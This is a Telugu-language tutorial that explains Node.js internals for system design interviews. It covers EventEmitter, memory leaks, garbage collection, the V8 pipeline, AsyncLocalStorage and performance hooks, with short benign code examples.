చాలా Node.js ఆబ్జెక్టులు (ఉదాహరణకు: `http.Server`, `fs.ReadStream`) `EventEmitter` నుండే ఎక్స్‌టెండ్ (extend) అవుతాయి. ఇది సింపుల్‌గా చెప్పాలంటే:

- **Emitter:** ఏదైనా ఒక పని జరిగినప్పుడు ఒక "Event"ని పంపిస్తుంది (Emit).
- **Listener:** ఆ ఈవెంట్ కోసం ఎదురుచూస్తూ, అది రాగానే ఒక ఫంక్షన్‌ని రన్ చేస్తుంది (On).

---

### ఎలా పనిచేస్తుంది? (Core Methods)

1. **`.on(eventName, listener)`:** ఒక నిర్దిష్టమైన ఈవెంట్ కోసం లిజనర్‌ని రిజిస్టర్ చేస్తుంది.
2. **`.emit(eventName, data)`:** ఒక ఈవెంట్‌ను ట్రిగ్గర్ చేస్తుంది. దీనికి మనం డేటాను కూడా పంపవచ్చు.
3. **`.once(eventName, listener)`:** ఇది కేవలం ఒక్కసారి మాత్రమే రన్ అవుతుంది, ఆ తర్వాత ఆటోమేటిక్‌గా రిమూవ్ అవుతుంది.
4. **`.removeListener()`:** అనవసరమైన ఈవెంట్లను తొలగించడానికి.

---

### సిస్టమ్ డిజైన్ దృక్కోణంలో ప్రాముఖ్యత:

**1. Decoupling (డీకప్లింగ్):**
ఒక సిస్టమ్‌లో ఒక సర్వీస్ ఇంకో సర్వీస్ మీద డిపెండ్ అవ్వకుండా, ఈవెంట్స్ ద్వారా కమ్యూనికేట్ చేయడం వల్ల కోడ్ చాలా క్లీన్‌గా ఉంటుంది. ఉదాహరణకు: యూజర్ రిజిస్టర్ అయినప్పుడు, "UserRegistered" అనే ఈవెంట్‌ను ఎమిట్ చేస్తే, మెయిల్ సర్వీస్ మరియు నోటిఫికేషన్ సర్వీస్ దాన్ని విడివిడిగా ప్రాసెస్ చేయగలవు.

**2. Asynchronous Flow Control:**
Node.js లో చాలా వరకు అసింక్రోనస్ పనులు (Files, Network) ఈవెంట్స్ ఆధారంగానే నడుస్తాయి. మీరు అప్లికేషన్ డిజైన్ చేసేటప్పుడు, లాజికల్ సెపరేషన్ కోసం ఈవెంట్స్ వాడటం మంచి ప్రాక్టీస్.

---

### ఒక చిన్న ఉదాహరణ:

```javascript
const EventEmitter = require("events");
const myEmitter = new EventEmitter();

// లిజనర్ (Event Listener)
myEmitter.on("orderPlaced", (orderId) => {
  console.log(`Order ${orderId} is being processed!`);
});

// ఈవెంట్ ఎమిటర్ (Event Trigger)
myEmitter.emit("orderPlaced", 12345);
```

---

### ఇంటర్వ్యూలో గుర్తుంచుకోవాల్సిన చిట్కాలు (Pro Tips):

- **Memory Leaks:** మీరు `.on()` తో చాలా లిజనర్లను యాడ్ చేసి, వాటిని `.removeListener()` తో తొలగించకపోతే, అది **Memory Leak** కి దారితీస్తుంది. ఇది చాలా కామన్ ఇంటర్వ్యూ ప్రశ్న.
- **Error Handling:** `EventEmitter` లో ఏదైనా `error` ఈవెంట్ వస్తే, మీరు కచ్చితంగా దానికి ఒక లిజనర్‌ని రాయాలి. లేకపోతే, అప్లికేషన్ క్రాష్ అయ్యే ప్రమాదం ఉంది.
- **Pub/Sub vs EventEmitter:** సిస్టమ్ డిజైన్‌లో ఇంటర్వ్యూయర్ "ఒక సర్వర్ మీద 1000 ఈవెంట్స్ ఉంటే ఏం చేస్తారు?" అని అడిగితే:
- ఒకే Node.js ప్రాసెస్ లోపల అయితే **`EventEmitter`** వాడతాము.
- కానీ మైక్రోసర్వీసెస్ మధ్య అయితే **Message Brokers (Redis Pub/Sub, RabbitMQ, Kafka)** వాడతామని చెప్పాలి.

---

## Memory Management

Node.js లో **Memory Management** అనేది సిస్టమ్ డిజైన్ మరియు పర్ఫార్మెన్స్ ఆప్టిమైజేషన్‌లో అత్యంత కీలకమైన అంశం. ముఖ్యంగా మీ అప్లికేషన్ పెద్ద డేటాను హ్యాండిల్ చేస్తున్నప్పుడు మెమరీ మేనేజ్మెంట్ సరిగ్గా లేకపోతే సర్వర్ క్రాష్ (Out of Memory - OOM) అవుతుంది.

### Node.js మెమరీ ఎలా పనిచేస్తుంది?

Node.js లో మెమరీ రెండు ప్రధాన భాగాలుగా ఉంటుంది:

1. **V8 Heap:** మన JavaScript ఆబ్జెక్టులు, ఫంక్షన్లు, మరియు వేరియబుల్స్ ఇక్కడ స్టోర్ అవుతాయి. దీని సైజుపై పరిమితి ఉంటుంది.
2. **External Memory (C++):** `Buffer`, `Stream` వంటివి ఇక్కడ స్టోర్ అవుతాయి. ఇవి V8 హీప్ వెలుపల ఉంటాయి, అందుకే మనం లార్జ్ డేటాను హ్యాండిల్ చేయడానికి వీటిని ఉపయోగిస్తాం.

---

### Garbage Collection (GC)

V8 ఇంజిన్ **"Garbage Collector"** ద్వారా ఆటోమేటిక్‌గా మెమరీని క్లీన్ చేస్తుంది. ఎప్పుడైతే ఒక ఆబ్జెక్ట్‌కు రిఫరెన్స్ ఉండదో (అంటే కోడ్ లో ఎక్కడా వాడకపోతే), GC దాన్ని మెమరీ నుండి తొలగిస్తుంది.

- **Young Generation (Scavenge):** కొత్తగా క్రియేట్ అయిన చిన్న చిన్న ఆబ్జెక్టులను వేగంగా క్లీన్ చేస్తుంది.
- **Old Generation (Mark-Sweep-Compact):** ఎక్కువ కాలం ఉండిపోయిన పెద్ద ఆబ్జెక్టులను క్లీన్ చేస్తుంది. ఇది కొంచెం సమయం తీసుకుంటుంది.

---

### Memory Leaks (ఇంటర్వ్యూలో తప్పక అడగాల్సిన ప్రశ్న)

మెమరీ లీక్ అంటే ఏంటి? అంటే మనం వాడని ఆబ్జెక్టులను GC క్లీన్ చేయలేకపోవడం. దీనివల్ల మెమరీ వాడకం పెరుగుతూనే ఉంటుంది, చివరికి సర్వర్ ఆగిపోతుంది.

**కామన్ కారణాలు:**

1. **Global Variables:** అనవసరంగా గ్లోబల్ వేరియబుల్స్ వాడటం.
2. **Closures:** ఫంక్షన్ల లోపల ఫంక్షన్లు వాడేటప్పుడు పాత రిఫరెన్స్‌లను వదిలేయడం.
3. **Forgotten Event Listeners:** `EventEmitter` కి లిజనర్లను యాడ్ చేసి రిమూవ్ చేయకపోవడం.
4. **setInterval/Timers:** టైమర్లను క్లియర్ (`clearInterval`) చేయకపోవడం.

---

### మెమరీ ఆప్టిమైజేషన్ ఎలా చేయాలి? (Best Practices)

1. **Streams వాడండి:** పెద్ద ఫైల్స్ చదవడానికి `fs.readFile` బదులు `fs.createReadStream` వాడండి. ఇది మెమరీని ఒక్కసారిగా నింపదు.
2. **Proper Cleanup:** `Event listeners` ని `removeListener()` తో రిమూవ్ చేయండి.
3. **Object Nullification:** పెద్ద డేటా ఆబ్జెక్టులు పని అయిపోయాక `obj = null` అని సెట్ చేయడం ద్వారా GC కి అవి క్లీన్ చేయడానికి వీలు కలుగుతుంది.
4. **Pagination:** డేటాబేస్ నుండి లక్షల రికార్డులను ఒకేసారి తెచ్చుకోకుండా, Pagination (limit/offset) వాడండి.
5. **Monitoring:** `process.memoryUsage()` ద్వారా మీ అప్లికేషన్ ఎంత మెమరీ వాడుతుందో ఎప్పటికప్పుడు చెక్ చేయండి.

---

### ఇంటర్వ్యూయర్ అడిగితే ఎలా చెప్పాలి?

> "ఒకవేళ నా Node.js అప్లికేషన్‌లో మెమరీ లీక్ అవుతుంటే, నేను మొదట **Heap Snapshot** తీస్తాను. `Chrome DevTools` లేదా `Clinic.js` వంటి టూల్స్ వాడి ఏ ఆబ్జెక్టులు ఎక్కువ మెమరీని ఆక్రమిస్తున్నాయో గుర్తిస్తాను. లిజనర్లు, క్లోజర్లు లేదా పెద్ద డేటా ఆబ్జెక్టులను సరిగ్గా మేనేజ్ చేస్తున్నానో లేదో చూసి, కోడ్‌ను ఆప్టిమైజ్ చేస్తాను."

---

## Garbage Collection

Node.js లో **Garbage Collection (GC)** అనేది మెమరీ మేనేజ్‌మెంట్‌లో అతి ముఖ్యమైన భాగం. మనం కోడ్ రాస్తున్నప్పుడు మెమరీని ఎలా మేనేజ్ చేస్తామో తెలియకపోతే, అప్లికేషన్ నెమ్మదించడం లేదా సర్వర్ క్రాష్ అవ్వడం జరుగుతుంది. దీని గురించి వివరంగా తెలుసుకుందాం.

### Garbage Collection అంటే ఏమిటి?

JavaScript లో మనం C++ లాగా మెమరీని మాన్యువల్‌గా విడుదల (free) చేయనక్కర్లేదు. V8 ఇంజిన్ (Node.js ని రన్ చేసేది) తనంతట తానే ఏ ఆబ్జెక్టులు అవసరం లేదో గుర్తించి, వాటిని తొలగిస్తుంది. ఈ ప్రాసెస్ నే **Garbage Collection** అంటారు.

---

### V8 ఇంజిన్ మెమరీని ఎలా విభజిస్తుంది? (Heap Memory)

V8 తన హీప్ మెమరీని ప్రధానంగా రెండు రకాలుగా విభజిస్తుంది:

1. **Young Generation (New Space):**

- ఇక్కడ కొత్తగా క్రియేట్ అయిన ఆబ్జెక్టులు ఉంటాయి.
- ఇది చిన్నగా ఉంటుంది మరియు చాలా వేగంగా (Minor GC) క్లీన్ అవుతుంది.
- చాలా ఆబ్జెక్టులు ఇక్కడే క్రియేట్ అయ్యి, పని అయిపోగానే తొలగిపోతాయి.

2. **Old Generation (Old Space):**

- చాలా కాలం పాటు మెమరీలో ఉండే ఆబ్జెక్టులు ఇక్కడికి మారుతాయి.
- దీని సైజు పెద్దగా ఉంటుంది మరియు దీని క్లీనింగ్ (Major GC) కొంచెం సమయం తీసుకుంటుంది.

---

### GC ఎలా పనిచేస్తుంది? (Key Strategies)

V8 ప్రధానంగా **"Mark-and-Sweep"** అనే అల్గోరిథం వాడుతుంది:

1. **Marking:** GC మొదట మెమరీలోని ఆబ్జెక్టులన్నింటినీ స్కాన్ చేస్తుంది. ఏ ఆబ్జెక్టులు ఇంకా కోడ్ ద్వారా యాక్సెస్ చేయబడుతున్నాయో (Reachable) వాటిని "Mark" చేస్తుంది.
2. **Sweeping:** మార్క్ చేయని ఆబ్జెక్టులు (అంటే ఎవరూ వాడట్లేదని అర్థం) అనవసరమైనవిగా గుర్తించి, ఆ మెమరీని విడుదల చేస్తుంది.

---

### సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో ఇవి చాలా ముఖ్యం:

**1. "Stop-the-World" Event:**
GC పని చేస్తున్నప్పుడు, అప్లికేషన్ కోడ్ కాసేపు ఆగిపోతుంది. దీన్నే "Stop-the-world" అంటారు. ఇది ఎక్కువసేపు జరిగితే, మీ సర్వర్ రెస్పాన్స్ టైమ్ పెరిగిపోతుంది (Latency).

**2. Memory Leaks (GC ఎందుకు క్లీన్ చేయలేకపోతుంది?):**
GC ఎంత తెలివైనదైనా, మన కోడ్ తప్పుగా ఉంటే అది క్లీన్ చేయలేదు:

- **Global Variables:** గ్లోబల్ వేరియబుల్స్ ఎప్పుడూ Reachable లోనే ఉంటాయి, కాబట్టి అవి ఎప్పటికీ క్లీన్ అవ్వవు.
- **Closures:** ఫంక్షన్ స్కోప్ బయట ఆబ్జెక్టులను పట్టుకుని ఉంచే క్లోజర్లు మెమరీని వదలవు.
- **Detached DOM/Nodes:** ఏదైనా ఈవెంట్ లిజనర్ రిమూవ్ చేయకుండా వదిలేస్తే, ఆ ఆబ్జెక్ట్ మెమరీలోనే ఉండిపోతుంది.

---

### డెవలపర్‌గా మీరు ఏం చేయాలి?

- **ప్రొఫైలింగ్ (Profiling):** సర్వర్ పర్ఫార్మెన్స్ తగ్గుతుంటే, Chrome DevTools లేదా `clinic.js` వాడి Heap Snapshot తీసి, ఎక్కడ మెమరీ ఎక్కువైందో చూడాలి.
- **`--max-old-space-size`:** మీ సర్వర్ రామ్ ఎక్కువగా ఉన్నా, Node.js కి డిఫాల్ట్‌గా తక్కువ మెమరీనే కేటాయిస్తుంది. మీరు కావాలంటే `node --max-old-space-size=4096 app.js` అని సెట్ చేసి మెమరీ పరిమితిని పెంచవచ్చు.
- **డేటాను చిన్నగా ఉంచండి:** భారీ ఆబ్జెక్టులను చాలా సేపు పట్టుకోకుండా, పని అయిపోయాక `null` చేయండి.

---

### ఇంటర్వ్యూ చిట్కా:

ఇంటర్వ్యూయర్ "GC పెర్ఫార్మెన్స్ సమస్యలను ఎలా పరిష్కరిస్తారు?" అని అడిగితే, ఇలా చెప్పండి:

> "ముందుగా నేను `process.memoryUsage()` ద్వారా మెమరీ పెరుగుదల ధోరణిని గమనిస్తాను. సమస్య ఎక్కువగా ఉంటే, **Heap Dump** తీసి అది `Young` లేదా `Old` జనరేషన్‌లో ఎక్కడ ఎక్కువైందో విశ్లేషిస్తాను. అనవసరమైన క్లోజర్లు, ఈవెంట్ లిజనర్లను తొలగించి, అవసరమైతే `max-old-space-size` ఫ్లాగ్‌ని అడ్జస్ట్ చేస్తాను."

---

## V8 Engine

Node.js యొక్క వేగం మరియు సామర్థ్యానికి **V8 Engine** ప్రధాన కారణం. ఇది గూగుల్ డెవలప్ చేసిన ఓపెన్-సోర్స్ JavaScript ఇంజిన్. క్రోమ్ బ్రౌజర్ మరియు Node.js రెండూ V8 పైనే నడుస్తాయి.

సిస్టమ్ డిజైన్ పరంగా V8 ఎలా పనిచేస్తుందో తెలుసుకోవడం చాలా ముఖ్యం.

### 1. V8 Engine ఏమి చేస్తుంది?

JavaScript అనేది ఒక Interpreted లాంగ్వేజ్, కానీ V8 దీన్ని **Just-In-Time (JIT) Compilation** పద్ధతిలో రన్ చేస్తుంది.

- **Interpreted:** కోడ్‌ను లైన్ బై లైన్ రన్ చేస్తుంది.
- **Compiled:** కోడ్‌ను నేరుగా మిషన్ కోడ్ (Machine Code - 0s and 1s) లోకి మార్చి రన్ చేస్తుంది.
  దీని వల్ల జావాస్క్రిప్ట్ కోడ్ సి/సి++ కోడ్‌తో సమానమైన వేగంతో పనిచేస్తుంది.

---

### 2. V8 లోని ముఖ్యమైన భాగాలు (Pipeline)

V8 కోడ్‌ని ఎలా ప్రాసెస్ చేస్తుందో ఈ స్టెప్స్ గుర్తుంచుకోండి:

1. **Parser:** మీరు రాసిన JS కోడ్‌ను అర్థం చేసుకుని, దాన్ని **Abstract Syntax Tree (AST)** గా మారుస్తుంది.
2. **Ignition (Interpreter):** ఇది AST ని **Bytecode** గా మారుస్తుంది. ఇది చాలా వేగంగా ఉంటుంది.
3. **TurboFan (Compiler):** ఇది V8 లోని 'Optimization' భాగం. మీరు ఒకే ఫంక్షన్‌ను పదే పదే రన్ చేస్తుంటే, టర్బోఫాన్ దాన్ని గమనించి, ఆ కోడ్‌ను అత్యంత వేగవంతమైన **Optimized Machine Code** లోకి మారుస్తుంది.
4. **Deoptimization:** ఒకవేళ టర్బోఫాన్ ఊహించిన డేటా టైప్ మారితే, అది తిరిగి బ్యాక్‌వర్డ్‌కు వెళ్తుంది (దీన్నే Deoptimization అంటారు).

---

### 3. సిస్టమ్ డిజైన్ దృక్కోణంలో V8 ప్రాముఖ్యత

- **Hidden Classes:** JS అనేది డైనమిక్ లాంగ్వేజ్ (డేటా టైప్స్ మారుతూ ఉంటాయి). V8 లో "Hidden Classes" అనే కాన్సెప్ట్ ఉంటుంది. ఇది ఆబ్జెక్టుల స్ట్రక్చర్లను గుర్తిస్తుంది. మీరు కోడ్ రాసేటప్పుడు ఆబ్జెక్టులలో ప్రాపర్టీలను ఒకే ఆర్డర్‌లో (ఉదా: `user.id`, `user.name`) వాడితే, V8 కోడ్‌ను బాగా ఆప్టిమైజ్ చేస్తుంది.
- **Inline Caching:** మీరు పదే పదే ఒకే రకమైన ఆబ్జెక్ట్ మెథడ్స్ వాడితే, V8 వాటిని మెమరీలో క్యాష్ చేస్తుంది. దీనివల్ల ఫంక్షన్ కాల్స్ చాలా వేగంగా జరుగుతాయి.
- **Garbage Collection (GC):** మనం ఇందాక మాట్లాడుకున్న `Minor GC` మరియు `Major GC` పనులన్నీ V8 లోనే జరుగుతాయి.

---

### 4. ఇంటర్వ్యూలో గుర్తుంచుకోవాల్సిన చిట్కాలు

ఇంటర్వ్యూయర్ "Node.js పర్ఫార్మెన్స్ పెంచడానికి కోడింగ్ లెవల్‌లో మీరు ఏమి చేస్తారు?" అని అడిగితే, మీరు V8 గురించి ఇలా చెప్పాలి:

1. **Avoid Deoptimization:** "నేను నా ఫంక్షన్లలో డేటా టైప్స్ (Data Types) ని ఒకేలా ఉండేలా చూసుకుంటాను. ఉదాహరణకు, ఒకసారి నంబర్, ఒకసారి స్ట్రింగ్ పంపడం వల్ల V8 కి కోడ్‌ను ఆప్టిమైజ్ చేయడం కష్టమవుతుంది."
2. **Hidden Classes:** "ఆబ్జెక్టులను క్రియేట్ చేసేటప్పుడు ఒకే రకమైన స్ట్రక్చర్‌ని పాటిస్తాను. దీనివల్ల V8 'Hidden Classes' ని ఎఫెక్టివ్‌గా వాడుకోగలదు."
3. **Large Objects:** "హీప్ మెమరీని నింపే పెద్ద ఆబ్జెక్టులను వాడకుండా, వీలైనంత వరకు మెమరీని ఫ్రీ చేస్తాను."

---

### సారాంశం (Summary)

V8 అనేది ఒక పవర్‌ఫుల్ ఇంజిన్, ఇది మీ JavaScript కోడ్‌ను మెషిన్ లెవల్ వరకు ఆప్టిమైజ్ చేస్తుంది.

- మీరు **Node.js Internals** (libuv, Event Loop) గురించి చదివారు.
- **Execution & Memory** (Garbage Collection, V8) గురించి చదివారు.
- **Scalability** (Cluster, Threads, Streams) గురించి చదివారు.

---

## AsyncLocalStorage

**AsyncLocalStorage** అనేది Node.js లోని `async_hooks` మాడ్యూల్ మీద ఆధారపడి పనిచేసే ఒక పవర్‌ఫుల్ ఫీచర్. సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో "Request Context" లేదా "Tracing" గురించి మాట్లాడేటప్పుడు ఇది చాలా ఉపయోగపడుతుంది.

### AsyncLocalStorage అంటే ఏమిటి?

ఒక రిక్వెస్ట్ (Request) సర్వర్‌లోకి వచ్చినప్పటి నుండి, అది పూర్తయ్యే వరకు ఆ రిక్వెస్ట్‌కు సంబంధించిన కొంత డేటాను (ఉదా: `requestId`, `userId`, `traceId`) మెయింటైన్ చేయడం దీని పని. సాధారణంగా, ఒక ఫంక్షన్ నుండి ఇంకో ఫంక్షన్‌కు డేటాను పాస్ చేయాలంటే మనం ఆర్గ్యుమెంట్స్ ద్వారా పంపుతాము (దీన్నే **Prop Drilling** అంటారు). AsyncLocalStorage ద్వారా అది లేకుండానే, డేటాను ఒక "Shared Context" లాగా వాడవచ్చు.

---

### ఇది ఎందుకు ముఖ్యం?

1. **Request Tracing:** మైక్రోసర్వీసెస్‌లో ఒక రిక్వెస్ట్ ఐడిని ప్రతి ఫంక్షన్‌లో పట్టుకుని తిప్పడం కష్టం. `AsyncLocalStorage` వాడితే, ఆ ఐడిని ఒకే చోట స్టోర్ చేసి, ఆ రిక్వెస్ట్ ప్రాసెస్ అవుతున్నంత సేపు ఏ ఫంక్షన్ నుండైనా దాన్ని యాక్సెస్ చేయవచ్చు.
2. **Context Management:** యూజర్ లాగిన్ అయి ఉన్నారా? ఆ యూజర్ ఐడి ఏంటి? ఇలాంటి సెషన్ డేటాను గ్లోబల్ వేరియబుల్స్ లా కాకుండా, కేవలం ఆ రిక్వెస్ట్ స్కోప్ లోనే భద్రపరచవచ్చు.
3. **Thread-Safety:** ఇది అసింక్రోనస్ కోడ్‌లో కూడా సురక్షితం. ఒక రిక్వెస్ట్ డేటా మరొక రిక్వెస్ట్ డేటాతో కలవదు.

---

### కోడ్ ఉదాహరణ:

```javascript
const { AsyncLocalStorage } = require("async_hooks");
const asyncLocalStorage = new AsyncLocalStorage();

// రిక్వెస్ట్ రాగానే కంటెక్స్ట్ సెట్ చేయడం
function handleRequest(req, res) {
  const store = { requestId: Math.random() };

  asyncLocalStorage.run(store, () => {
    // లోపల ఉన్న ఏ ఫంక్షన్ అయినా ఈ కంటెక్స్ట్‌ను తీసుకోవచ్చు
    doSomething();
  });
}

function doSomething() {
  const store = asyncLocalStorage.getStore();
  console.log(`Processing request: ${store.requestId}`);
}
```

---

### సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో టిప్స్:

- **ఎప్పుడు వాడాలి?**: మీరు లాగింగ్ (Logging), మానిటరింగ్ (Tracing), లేదా పర్మిషన్ చెకింగ్ (Authorization) చేస్తున్నప్పుడు ఇది బెస్ట్ సొల్యూషన్.
- **Global Variables తో పోలిక**: గ్లోబల్ వేరియబుల్స్ వాడితే సర్వర్ క్రాష్ అవుతుంది (ఎందుకంటే అన్ని రిక్వెస్టులు ఒకే వేరియబుల్‌ని వాడతాయి). కానీ `AsyncLocalStorage` ప్రతి రిక్వెస్ట్‌కు ఒక ప్రత్యేకమైన **Store** ని ఇస్తుంది. కాబట్టి ఇది సేఫ్.
- **హెచ్చరిక:** దీన్ని అతిగా వాడితే కోడ్ ఫ్లో అర్థం చేసుకోవడం కష్టమవుతుంది (Implicit context dependency). అందుకే అవసరమైన చోట మాత్రమే వాడాలి.

---

### మీ ప్రిపరేషన్ సారాంశం:

ఇప్పటి వరకు మీరు నేర్చుకున్న విషయాలు:

1. **Architecture:** Event Loop, Libuv, V8.
2. **Scalability:** Worker Threads, Cluster.
3. **Efficiency:** Streams, Buffers, Garbage Collection.
4. **Flow Control:** EventEmitter, Async Hooks, AsyncLocalStorage.

---

## Performance Hooks

Node.js లో **Performance Hooks** (`perf_hooks` మాడ్యూల్) అనేది మీ అప్లికేషన్ యొక్క వేగాన్ని (Performance) మరియు మెమరీ వినియోగాన్ని కొలవడానికి (Measurement & Analysis) ఉపయోగించే ఒక పవర్‌ఫుల్ టూల్.

సిస్టమ్ డిజైన్ ఇంటర్వ్యూలలో "మీ అప్లికేషన్ స్లోగా ఉంటే ఎలా పట్టుకుంటారు?" లేదా "పర్ఫార్మెన్స్ ఎలా ఆప్టిమైజ్ చేస్తారు?" అని అడిగినప్పుడు, మీరు ఈ `perf_hooks` గురించి తప్పక చెప్పాలి.

---

### Performance Hooks ఎందుకు వాడాలి?

మీరు రాసిన కోడ్ లోని ఏ భాగం ఎక్కువ సమయం తీసుకుంటుందో (Latency), CPU ఎంత వాడుతుందో, లేదా ఒక ఫంక్షన్ ఎగ్జిక్యూట్ అవ్వడానికి ఎంత సమయం పడుతుందో కచ్చితంగా తెలుసుకోవడానికి ఇది వాడతారు.

### ముఖ్యమైన ఫీచర్లు:

1. **`performance.now()`**: ఇది చాలా కచ్చితమైన సమయాన్ని (High-resolution timestamp) ఇస్తుంది. `Date.now()` కంటే ఇది ఎంతో మెరుగైనది.
2. **`PerformanceObserver`**: ఇది అప్లికేషన్ రన్ అవుతున్నప్పుడు జరిగే ఈవెంట్లను (ఉదా: GC, Event Loop Lag) అబ్జర్వ్ చేస్తుంది.
3. **`performance.mark()` & `performance.measure()**`: కోడ్‌లో ఒక నిర్దిష్ట భాగం (ഉదా: API call నుండి DB response వరకు) ఎంత సమయం తీసుకుందో కొలవడానికి వీటిని వాడతారు.

---

### కోడ్ ఉదాహరణ:

```javascript
const { performance, PerformanceObserver } = require("perf_hooks");

// అబ్జర్వర్ ని సెట్ చేయడం
const obs = new PerformanceObserver((list) => {
  list.getEntries().forEach((entry) => {
    console.log(`${entry.name}: ${entry.duration}ms`);
  });
});
obs.observe({ entryTypes: ["measure"] });

// మెజర్మెంట్ మొదలుపెట్టడం
performance.mark("start-process");

// కొంత పని...
setTimeout(() => {
  performance.mark("end-process");
  performance.measure("my-custom-task", "start-process", "end-process");
}, 500);
```

---

### సిస్టమ్ డిజైన్ మరియు ఇంటర్వ్యూ టిప్స్:

- **Event Loop Lag Monitoring:** సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో ఒక ఇంపార్టెంట్ పాయింట్: "నేను **Event Loop Lag** ని మానిటర్ చేస్తాను". `perf_hooks` ద్వారా మన ఈవెంట్ లూప్ ఎంతసేపు ఖాళీగా లేకుండా బిజీగా ఉందో తెలుసుకోవచ్చు. లూప్ లాగ్ ఎక్కువైతే, సర్వర్ నెమ్మదిస్తుంది.
- **GC Monitoring:** `perf_hooks` ద్వారా Garbage Collection ఎంత సమయం తీసుకుంటుందో తెలుసుకోవచ్చు. ఇది ఎక్కువైతే, కోడ్‌ను ఆప్టిమైజ్ చేయాలి.
- **Production Observability:** నిజమైన ప్రొడక్షన్ సిస్టమ్స్‌లో, ఈ హుక్స్ నుండి వచ్చే డేటాను మనం **Prometheus** లేదా **Grafana** వంటి టూల్స్‌కి పంపి, గ్రాఫ్స్ రూపంలో చూడవచ్చు.

---
